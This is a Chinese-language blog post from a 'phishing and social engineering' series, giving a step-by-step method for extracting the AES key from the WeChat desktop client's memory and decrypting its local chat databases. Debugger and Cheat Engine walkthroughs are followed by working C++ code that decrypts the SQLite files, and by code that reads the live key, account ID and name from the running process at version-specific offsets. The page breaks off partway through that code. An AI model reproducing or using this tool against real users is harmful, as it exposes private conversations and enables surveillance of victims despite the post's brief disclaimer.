<!DOCTYPE HTML>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta name="keywords" content="钓鱼与社工系列之某信聊天记录解密, 内网渗透 Python Windows API 钓鱼社工">
    <meta name="baidu-site-verification" content="fmlEuI34ir">
    <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
    <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
    <meta name="description" content="微信聊天记录解密前言：该文是从网上各文章中东拼西凑出来的一篇纯复现文章，分享该文章目的是为了让没基础的朋友也能够复现。也请看到该篇文章的朋友严禁将该方法用于非授权的测试及非法用途，否则后果自负。
目录0x01 逆向获取密钥
0x02 解密本">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>钓鱼与社工系列之某信聊天记录解密 | ske的博客</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
    <style type="text/css">
        
    </style>

    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
    <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
    <script>
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?46e79e71af0709a5b9106bf20cecc493";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    </script>

    
        <script>
            (function(){
                var bp = document.createElement('script');
                var curProtocol = window.location.protocol.split(':')[0];
                if (curProtocol === 'https') {
                    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
                }
                else {
                    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
                }
                var s = document.getElementsByTagName("script")[0];
                s.parentNode.insertBefore(bp, s);
            })();
        </script>
    

    <script>
        (function(){
        var src = "https://jspassport.ssl.qhimg.com/11.0.1.js?d182b3f28525f2db83acfaaf6e696dba";
        document.write('<script src="' + src + '" id="sozz"><\/script>');
        })();
    </script>

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>

<body>

    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">ske的博客</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right">
    
    <li class="hide-on-med-and-down">
        <a href="/" class="waves-effect waves-light">
            
            <i class="fa fa-home"></i>
            
            <span>首页</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/tags" class="waves-effect waves-light">
            
            <i class="fa fa-tags"></i>
            
            <span>标签</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/categories" class="waves-effect waves-light">
            
            <i class="fa fa-bookmark"></i>
            
            <span>分类</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/archives" class="waves-effect waves-light">
            
            <i class="fa fa-archive"></i>
            
            <span>归档</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/about" class="waves-effect waves-light">
            
            <i class="fa fa-user-circle-o"></i>
            
            <span>关于</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/friends" class="waves-effect waves-light">
            
            <i class="fa fa-address-book"></i>
            
            <span>友情链接</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/contact" class="waves-effect waves-light">
            
            <i class="fa fa-comments"></i>
            
            <span>留言板</span>
        </a>
    </li>
    
    <li>
        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
        </a>
    </li>
</ul>

<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">ske的博客</div>
        <div class="logo-desc">
            
            内网渗透 | Python | Windows API | 钓鱼社工
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li>
            <a href="/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-home"></i>
                
                首页
            </a>
        </li>
        
        <li>
            <a href="/tags" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-tags"></i>
                
                标签
            </a>
        </li>
        
        <li>
            <a href="/categories" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-bookmark"></i>
                
                分类
            </a>
        </li>
        
        <li>
            <a href="/archives" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-archive"></i>
                
                归档
            </a>
        </li>
        
        <li>
            <a href="/about" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-user-circle-o"></i>
                
                关于
            </a>
        </li>
        
        <li>
            <a href="/friends" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-address-book"></i>
                
                友情链接
            </a>
        </li>
        
        <li>
            <a href="/contact" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-comments"></i>
                
                留言板
            </a>
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/SkewwG/hexo-matery-modified" class="waves-effect waves-light" target="_blank">
                <i class="fa fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>

        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/SkewwG/hexo-matery-modified" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/img/wechatDecrypt/015f7461-031b-475f-bbcb-52ff97ce98d3.png')">
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <div class="description center-align post-title">
                        钓鱼与社工系列之某信聊天记录解密
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<main class="container content">

    
    <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                        <a href="/tags/钓鱼与社工系列之某信聊天记录解密/" target="_blank">
                            <span class="chip bg-color">钓鱼与社工系列之某信聊天记录解密</span>
                        </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fa fa-bookmark fa-fw icon-category"></i>
                        
                        <a href="/categories/钓鱼与社工/" class="post-category" target="_blank">
                            钓鱼与社工
                        </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                <div class="post-date info-break-policy">
                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2021-06-15
                </div>

                <div class="post-author info-break-policy">
                    <i class="fa fa-user-o fa-fw"></i>作者:&nbsp;&nbsp;
                    
                    ske
                    
                </div>

                
                
                <div class="info-break-policy">
                    <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
                    2.9k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    13 分
                </div>
                
                

                
                <div id="busuanzi_container_page_pv" class="info-break-policy">
                    <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                    <span id="busuanzi_value_page_pv"></span>
                </div>
                
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="微信聊天记录解密"><a href="#微信聊天记录解密" class="headerlink" title="微信聊天记录解密"></a>微信聊天记录解密</h1><p><strong>前言：该文是从网上各文章中东拼西凑出来的一篇纯复现文章，分享该文章目的是为了让没基础的朋友也能够复现。也请看到该篇文章的朋友严禁将该方法用于非授权的测试及非法用途，否则后果自负。</strong></p>
<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><pre><code>0x01 逆向获取密钥
0x02 解密本地数据库
0x03 CE寻找密钥的基址
0x04 实现获取动态密钥的代码
0x05 实战
0x06 总结
0x07 参考链接</code></pre><h2 id="0x01-逆向获取密钥"><a href="#0x01-逆向获取密钥" class="headerlink" title="0x01 逆向获取密钥"></a>0x01 逆向获取密钥</h2><p>微信的数据库存储在本地</p>
<pre><code>好友微信id等各种信息存储在该目录下
C:\Users\xxxxxx\Documents\WeChat Files\wxid_xxxxxxxxxx\Msg</code></pre><p><img src="/img/wechatDecrypt/cb583ea8-ef9b-4863-9b7d-8aecc2686ade.png" alt="img"></p>
<pre><code>和微信好友的聊天记录存储在multi目录下的MSG0.db数据库里
C:\Users\xxxxxx\Documents\WeChat Files\wxid_xxxxxxxxxx\Msg\Multi</code></pre><p><img src="/img/wechatDecrypt/f2e6ca0e-21d0-4941-8924-7f1fee8b6018.png" alt="img"></p>
<p>解密这些数据库需要密钥，密钥是所有数据库共用同一个密钥，所以逆向的时候找到解密其中一个数据库时用的密钥即可。</p>
<p>至于如何找到这个密钥，因为这些数据库都是通过AES加密，而AES的密钥是32位的，32的十六位进制是20，所以在逆向的过程中重点关注20这个数字。</p>
<p>下面开始详细的寻找密钥过程，因为水平有限，所以跟着前辈的路线走，目的就是为了找到密钥是多少</p>
<p>从下面这篇文章中知道可以通过   open db fail=%d ,error=%s   这个字符串取定位到密钥附近的代码</p>
<p><img src="/img/wechatDecrypt/ff542cb4-95fa-44c1-a3ba-d66c3cfad16e.jpg" alt="img"></p>
<p>于是使用x32dbg去跟踪</p>
<p>使用x32dbg打开wechat.exe程序</p>
<p><img src="/img/wechatDecrypt/59063add-f202-4d66-a086-f7924bb85d4f.png" alt="img"></p>
<p>会弹出微信的登录框</p>
<p><img src="/img/wechatDecrypt/e6831483-e1ae-4313-850a-8f3695acd6f3.png" alt="img"></p>
<p>右键–&gt;搜索–&gt;所有模块–&gt;字符串</p>
<p><img src="/img/wechatDecrypt/4abbbe2a-7491-4c2f-be34-b7dd41d2f735.png" alt="img"></p>
<p>在引用的搜索框中输入  open db fail=%d ,error=%s</p>
<p><img src="/img/wechatDecrypt/476e5917-7dd4-4027-aa72-422adfd0ab67.png" alt="img"></p>
<p>选中这两行按F2设置断点</p>
<p><img src="/img/wechatDecrypt/6072f753-458d-4ac1-82a7-488a828a896b.png" alt="img"></p>
<p>根据文章中的说明对红框中的代码设置断点</p>
<p><img src="/img/wechatDecrypt/72eb9656-e420-4f39-9768-066775dc54e3.jpg" alt="img"></p>
<p>于是双击第一个断点，进入CPU页面，对je wechatwin.57A3DCDB设置断点</p>
<p><img src="/img/wechatDecrypt/432dabc8-9b04-473d-aa62-f0f875da9244.png" alt="img"></p>
<p>接下来重启</p>
<p><img src="/img/wechatDecrypt/7f566fc9-d3da-4fc9-8d77-17909308b0ed.png" alt="img"></p>
<p>双击登录</p>
<p><img src="/img/wechatDecrypt/b32fe909-2b4d-49c7-80ed-de7229b5df48.png" alt="img"></p>
<p>此时跳到了刚才断点处</p>
<p><img src="/img/wechatDecrypt/acde8fe8-60dc-4090-b8c9-0af2c892dbc4.png" alt="img"></p>
<p>按F7单步步进，进入到 cmp dword ptr ds:[ebx+30],0</p>
<p><img src="/img/wechatDecrypt/01a1a37f-03e7-4448-a3fc-6066fd40de74.png" alt="img"></p>
<p>往下翻，对红框的内容设置断点</p>
<p><img src="/img/wechatDecrypt/3c9ca3cf-947f-4ab5-8e8f-0d7e62caf4b9.png" alt="img"></p>
<p>按F9重新回到了一开始的断点处</p>
<p><img src="/img/wechatDecrypt/2f2f3f99-a473-42b6-a828-bf289e6224b9.png" alt="img"></p>
<p>继续按F9跳到了push eax，再按F9跳到push esi，然后查看eax的值</p>
<p><img src="/img/wechatDecrypt/e5c2fbd8-c6aa-4cce-9fcf-38e7e61df036.png" alt="img"></p>
<p>选中EAX的值，右键–&gt;在内存窗口中转到，可以看到下一个字节是数字20</p>
<p><img src="/img/wechatDecrypt/3651e57a-71dd-4f7b-aa9d-02bf9ceb5573.png" alt="img"></p>
<p>得到了密钥的地址：88 4D 88 04</p>
<p>接下来跳转到地址04884D88获取密钥的值</p>
<p>右键–&gt;转到–&gt;表达式</p>
<p><img src="/img/wechatDecrypt/9c913988-7bc1-4b12-ac2c-2004a0a455f5.png" alt="img"></p>
<p>输入刚才得到的地址04884D88</p>
<p><img src="/img/wechatDecrypt/35b17fbe-48a7-4da1-b339-7898818aaa5a.png" alt="img"></p>
<p>跳转过去后，取32个字节，即红框里的内容</p>
<pre><code>04884D88  6F 50 9B 68 38 4C 46 68 8B A0 8C 54 E1 0A DA 74  oP.h8LFh. .Tá.Út  
04884D98  21 30 09 87 52 84 43 AF 8E CF C9 14 F4 DF 95 19  !0..R.C¯.ÏÉ.ôß..  </code></pre><p><img src="/img/wechatDecrypt/b405598f-be82-4caf-b50e-c15d26ca6394.png" alt="img"></p>
<p>此时密钥拿到了，接下来尝试解密</p>
<h2 id="0x02-解密本地数据库"><a href="#0x02-解密本地数据库" class="headerlink" title="0x02 解密本地数据库"></a>0x02 解密本地数据库</h2><p>需要安装老版本的openssl，下载地址：<a href="https://slproweb.com/download/Win32OpenSSL-1_0_2u.exe" target="_blank" rel="noopener">https://slproweb.com/download/Win32OpenSSL-1_0_2u.exe</a></p>
<p>默认安装就行</p>
<p><img src="/img/wechatDecrypt/83267491-d0e0-414f-93b7-c1d9a8ad9d1f.png" alt="img"></p>
<p>接下来需要配置解密代码的项目，用Visual Studio创建C++控制台应用</p>
<p>根据顺序将openssl的include添加进去</p>
<p><img src="/img/wechatDecrypt/a76b5eb7-6601-411a-bd6c-054ac21e4cbd.png" alt="img"></p>
<p>同理添加lib目录</p>
<p><img src="/img/wechatDecrypt/e640f313-288c-4659-ad14-0c8050d5ec2e.png" alt="img"></p>
<p>如上增加两个库名称</p>
<p><img src="/img/wechatDecrypt/3639d69e-632c-48a4-8a36-980f49836e21.png" alt="img"></p>
<p>配置如上设置就可以了，接下来编译代码，代码如下。每次修改pass里的密钥即可。</p>
<pre><code>using namespace std;
#include &lt;Windows.h&gt;
#include &lt;iostream&gt;
#include &lt;openssl/rand.h&gt;
#include &lt;openssl/evp.h&gt;
#include &lt;openssl/aes.h&gt;
#include &lt;openssl/hmac.h&gt;
#undef _UNICODE
#define SQLITE_FILE_HEADER &quot;SQLite format 3&quot; 
#define IV_SIZE 16
#define HMAC_SHA1_SIZE 20
#define KEY_SIZE 32
#define SL3SIGNLEN 20
#ifndef ANDROID_WECHAT
#define DEFAULT_PAGESIZE 4096       //4048数据 + 16IV + 20 HMAC + 12
#define DEFAULT_ITER 64000
#else
#define NO_USE_HMAC_SHA1
#define DEFAULT_PAGESIZE 1024
#define DEFAULT_ITER 4000
#endif
//pc端密码是经过OllyDbg得到的32位pass。
unsigned char pass[] = { 0xba,0x9f,0x56,0x04,0xc7,0x6b,0x4a,0xd5,0x8c,0xf7,0xaa,0x46,0x78,0x2c,0x7f,0xb7,0x2b,0x03,0xc5,0xfd,0x00,0x10,0x41,0xdb,0x9a,0xd6,0x6b,0x5f,0x6b,0x16,0x28,0xe1 };
char dbfilename[50];
int Decryptdb();
int CheckKey();
int CheckAESKey();
int main(int argc, char* argv[])
{
    if (argc &gt;= 2)    //第二个参数argv[1]是文件名
        strcpy_s(dbfilename, argv[1]);  //复制    
           //没有提供文件名，则提示用户输入
    else {
        cout &lt;&lt; &quot;请输入文件名:&quot; &lt;&lt; endl;
        cin &gt;&gt; dbfilename;
    }
    Decryptdb();
    return 0;
}
int Decryptdb()
{
    FILE* fpdb;
    fopen_s(&amp;fpdb, dbfilename, &quot;rb+&quot;);
    if (!fpdb)
    {
        printf(&quot;打开文件错!&quot;);
        getchar();
        return 0;
    }
    fseek(fpdb, 0, SEEK_END);
    long nFileSize = ftell(fpdb);
    fseek(fpdb, 0, SEEK_SET);
    unsigned char* pDbBuffer = new unsigned char[nFileSize];
    fread(pDbBuffer, 1, nFileSize, fpdb);
    fclose(fpdb);
    unsigned char salt[16] = { 0 };
    memcpy(salt, pDbBuffer, 16);
#ifndef NO_USE_HMAC_SHA1
    unsigned char mac_salt[16] = { 0 };
    memcpy(mac_salt, salt, 16);
    for (int i = 0; i &lt; sizeof(salt); i++)
    {
        mac_salt[i] ^= 0x3a;
    }
#endif
    int reserve = IV_SIZE;      //校验码长度,PC端每4096字节有48字节
#ifndef NO_USE_HMAC_SHA1
    reserve += HMAC_SHA1_SIZE;
#endif
    reserve = ((reserve % AES_BLOCK_SIZE) == 0) ? reserve : ((reserve / AES_BLOCK_SIZE) + 1) * AES_BLOCK_SIZE;
    unsigned char key[KEY_SIZE] = { 0 };
    unsigned char mac_key[KEY_SIZE] = { 0 };
    OpenSSL_add_all_algorithms();
    PKCS5_PBKDF2_HMAC_SHA1((const char*)pass, sizeof(pass), salt, sizeof(salt), DEFAULT_ITER, sizeof(key), key);
#ifndef NO_USE_HMAC_SHA1
    PKCS5_PBKDF2_HMAC_SHA1((const char*)key, sizeof(key), mac_salt, sizeof(mac_salt), 2, sizeof(mac_key), mac_key);
#endif
    unsigned char* pTemp = pDbBuffer;
    unsigned char pDecryptPerPageBuffer[DEFAULT_PAGESIZE];
    int nPage = 1;
    int offset = 16;
    while (pTemp &lt; pDbBuffer + nFileSize)
    {
        printf(&quot;解密数据页:%d/%d \n&quot;, nPage, nFileSize / DEFAULT_PAGESIZE);
#ifndef NO_USE_HMAC_SHA1
        unsigned char hash_mac[HMAC_SHA1_SIZE] = { 0 };
        unsigned int hash_len = 0;
        HMAC_CTX hctx;
        HMAC_CTX_init(&amp;hctx);
        HMAC_Init_ex(&amp;hctx, mac_key, sizeof(mac_key), EVP_sha1(), NULL);
        HMAC_Update(&amp;hctx, pTemp + offset, DEFAULT_PAGESIZE - reserve - offset + IV_SIZE);
        HMAC_Update(&amp;hctx, (const unsigned char*)&amp;nPage, sizeof(nPage));
        HMAC_Final(&amp;hctx, hash_mac, &amp;hash_len);
        HMAC_CTX_cleanup(&amp;hctx);
        if (0 != memcmp(hash_mac, pTemp + DEFAULT_PAGESIZE - reserve + IV_SIZE, sizeof(hash_mac)))
        {
            //printf(&quot;\n 哈希值错误! \n&quot;);
            //getchar();
            //return 0;
        }
#endif
        //
        if (nPage == 1)
        {
            memcpy(pDecryptPerPageBuffer, SQLITE_FILE_HEADER, offset);
        }
        EVP_CIPHER_CTX* ectx = EVP_CIPHER_CTX_new();
        EVP_CipherInit_ex(ectx, EVP_get_cipherbyname(&quot;aes-256-cbc&quot;), NULL, NULL, NULL, 0);
        EVP_CIPHER_CTX_set_padding(ectx, 0);
        EVP_CipherInit_ex(ectx, NULL, NULL, key, pTemp + (DEFAULT_PAGESIZE - reserve), 0);
        int nDecryptLen = 0;
        int nTotal = 0;
        EVP_CipherUpdate(ectx, pDecryptPerPageBuffer + offset, &amp;nDecryptLen, pTemp + offset, DEFAULT_PAGESIZE - reserve - offset);
        nTotal = nDecryptLen;
        EVP_CipherFinal_ex(ectx, pDecryptPerPageBuffer + offset + nDecryptLen, &amp;nDecryptLen);
        nTotal += nDecryptLen;
        EVP_CIPHER_CTX_free(ectx);
        memcpy(pDecryptPerPageBuffer + DEFAULT_PAGESIZE - reserve, pTemp + DEFAULT_PAGESIZE - reserve, reserve);
        char decFile[1024] = { 0 };
        sprintf_s(decFile, &quot;dec_%s&quot;, dbfilename);
        FILE* fp;
        fopen_s(&amp;fp, decFile, &quot;ab+&quot;);
        {
            fwrite(pDecryptPerPageBuffer, 1, DEFAULT_PAGESIZE, fp);
            fclose(fp);
        }
        nPage++;
        offset = 0;
        pTemp += DEFAULT_PAGESIZE;
    }
    printf(&quot;\n 解密成功! \n&quot;);
    return 0;
}</code></pre><p>编译出来exe，运行的时候跟上要解密的db文件即可</p>
<p><img src="/img/wechatDecrypt/21b66592-61ef-47be-8295-3d32612a6d43.png" alt="img"></p>
<p>解密结束后会在当前目录生成dec_MicroMsg.db文件。然后用打开sqlite3数据库的连接工具打开即可。</p>
<p><img src="/img/wechatDecrypt/661726c9-3400-4104-895f-06ef1e49b901.png" alt="img"></p>
<h2 id="0x03-CE寻找密钥的基址"><a href="#0x03-CE寻找密钥的基址" class="headerlink" title="0x03 CE寻找密钥的基址"></a>0x03 CE寻找密钥的基址</h2><p>下一步是如何获取动态密钥</p>
<p>方法是使用CE取寻找密钥的基址</p>
<p>先下载CE，下载地址</p>
<pre><code>https://d7qe0znl1rfet.cloudfront.net/installer/575474003088649/859880</code></pre><p>再下载中文语言包</p>
<pre><code>https://www.cheatengine.org/download/ch_cn.zip</code></pre><p>安装CE后，将中文语言包解压后放到该目录下</p>
<p><img src="/img/wechatDecrypt/bd146572-9a4d-40db-a157-bf9118cd9828.png" alt="img"></p>
<p>编辑language,ini文件</p>
<p><img src="/img/wechatDecrypt/2f16b4e4-127e-4174-a8bc-39e9e49fa54c.png" alt="img"></p>
<p>此时打开CE即使中文版，选择打开进程</p>
<p><img src="/img/wechatDecrypt/22f9b15b-909c-496c-8fcb-9e02a11b8f6a.png" alt="img"></p>
<p>选择微信进程</p>
<p><img src="/img/wechatDecrypt/d67599f8-9ded-4be5-9174-0f442b1bd290.png" alt="img"></p>
<p>通过之前找到的密钥去定位基址</p>
<pre><code>6F509B68384C46688BA08C54E10ADA7421300987528443AF8ECFC914F4DF9519</code></pre><p>字节数组–&gt;搜索数组–&gt;Hex–&gt;密钥值</p>
<p><img src="/img/wechatDecrypt/7458e12b-1a08-4228-bf9d-d47fc3cbe477.png" alt="img"></p>
<p>点击首次扫描，得到地址05E4BE68</p>
<p><img src="/img/wechatDecrypt/625e3dbc-da8d-4b9b-96b8-bac54ff7939a.png" alt="img"></p>
<p>新的扫描–&gt;所有类型–&gt;精确数值–&gt;Hex–&gt;上一步的地址–&gt;首次扫描</p>
<p><img src="/img/wechatDecrypt/fbe51b19-6d50-40bd-bcb1-a1a5ee17132f.png" alt="img"></p>
<p>得到了偏移量，即：WeChatWin.dll+1AD1F8C</p>
<p><img src="/img/wechatDecrypt/f6d65c6f-b530-4b40-bd5a-82b479871602.png" alt="img"></p>
<h2 id="0x04-实现获取动态密钥的代码"><a href="#0x04-实现获取动态密钥的代码" class="headerlink" title="0x04 实现获取动态密钥的代码"></a>0x04 实现获取动态密钥的代码</h2><p>最后就可以通过代码去获取，步骤则是</p>
<p>通过WeChatMainWndForPC获取微信的句柄，通过该句柄获取到微信的进程id，再找到微信的安装目录，拼接路径得到WeChatWin.dll的路径，通过上一步的偏移量得到密钥的值。</p>
<p>同理获取微信id和微信名的偏移量</p>
<p>字符串搜索微信id，找到了很多地址，选择05E开头的，因为密钥的偏移量是05E开头的，那么猜测微信id可能也存在同一个dll里，即WeChatWin.dll里</p>
<p><img src="/img/wechatDecrypt/540af94d-a9bf-414f-b325-64914bc60095.png" alt="img"></p>
<p>得到偏移量</p>
<p><img src="/img/wechatDecrypt/606a18a8-f4dc-4ef8-ad67-e377044cb80d.png" alt="img"></p>
<p>同理可以获取微信名称的偏移量。</p>
<p>核心代码如下：</p>
<p>getKey.h</p>
<pre><code>#pragma once
#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include &lt;tchar.h&gt;
#include &lt;direct.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;TlHelp32.h&gt;
#include &lt;string&gt;
#include &lt;strstream&gt;
#include &lt;list&gt;
#include &lt;Psapi.h&gt;  
#pragma comment (lib,&quot;Psapi.lib&quot;)  
#pragma comment(lib, &quot;Version.lib&quot;)
using namespace std;
const string wxVersoin1 = &quot;2.9.0.123&quot;;
#define version1 0x16B4D50
#define wxid_addr1 0x16B4914
#define wxname_addr1 0x16B498C
const string wxVersoin2 = &quot;2.9.0.112&quot;;
#define version2 0x16B4C70
#define wxid_addr2 0x16B4834
#define wxname_addr2 0x16B48AC
const string wxVersoin3 = &quot;2.9.5.56&quot;;
#define version3 0x17744A8
#define wxid_addr3 0x1774054
#define wxname_addr3 0x17740CC
const string wxVersoin4 = &quot;3.2.1.154&quot;;
#define version4 0x1AD1F8C
#define wxid_addr4 0x1AC2100
#define wxname_addr4 0x1AD1BAC
DWORD GetProcessIDByName(const char* pName);
PVOID GetProcessImageBase(DWORD dwProcessId, const char* dllName);
DWORD IsWxVersionValid(WCHAR* VersionFilePath);
int GetdbKey(unsigned char* databasekey, unsigned char* wxid);</code></pre><p>getKey.cpp</p>
<pre><code>#include &quot;getKey.h&quot;
#include &lt;iostream&gt;
//判断微信版本，确定偏移
DWORD IsWxVersionValid(WCHAR* VersionFilePath)
{
    string asVer = &quot;&quot;;
    VS_FIXEDFILEINFO* pVsInfo;
    unsigned int iFileInfoSize = sizeof(VS_FIXEDFILEINFO);
    int iVerInfoSize = GetFileVersionInfoSizeW(VersionFilePath, NULL);
    if (iVerInfoSize != 0) {
        char* pBuf = new char[iVerInfoSize];
        if (GetFileVersionInfoW(VersionFilePath, 0, iVerInfoSize, pBuf)) {
            if (VerQueryValue(pBuf, TEXT(&quot;\\&quot;), (void**)&amp;pVsInfo, &amp;iFileInfoSize)) {
                //主版本2.9.0.123
                //2
                int s_major_ver = (pVsInfo-&gt;dwFileVersionMS &gt;&gt; 16) &amp; 0x0000FFFF;
                //9
                int s_minor_ver = pVsInfo-&gt;dwFileVersionMS &amp; 0x0000FFFF;
                //0
                int s_build_num = (pVsInfo-&gt;dwFileVersionLS &gt;&gt; 16) &amp; 0x0000FFFF;
                //123
                int s_revision_num = pVsInfo-&gt;dwFileVersionLS &amp; 0x0000FFFF;
                //把版本变成字符串
                strstream wxVer;
                wxVer &lt;&lt; s_major_ver &lt;&lt; &quot;.&quot; &lt;&lt; s_minor_ver &lt;&lt; &quot;.&quot; &lt;&lt; s_build_num &lt;&lt; &quot;.&quot; &lt;&lt; s_revision_num;
                wxVer &gt;&gt; asVer;
            }
        }
        delete[] pBuf;
    }
    printf(&quot;var = %s\n&quot;, asVer.c_str());

    if (asVer == wxVersoin1)
        return version1;
    else if (asVer == wxVersoin2)
        return version2;
    else if (asVer == wxVersoin3)
        return version3;
    else if (asVer == wxVersoin4)
        return version4;
    else
        return 0;

    return version4;
}
//通过pid和模块名获取基址
PVOID GetProcessImageBase(DWORD dwProcessId, const char* dllName)
{
    PVOID pProcessImageBase = NULL;
    MODULEENTRY32 me32 = { 0 };
    me32.dwSize = sizeof(MODULEENTRY32);
    // 获取指定进程全部模块的快照
    HANDLE hModuleSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessId);
    if (INVALID_HANDLE_VALUE == hModuleSnap)
    {
        return pProcessImageBase;
    }
    // 获取快照中第一条信息
    BOOL bRet = ::Module32First(hModuleSnap, &amp;me32);
    while (strcmp((char*)me32.szModule, dllName) != 0)
    {
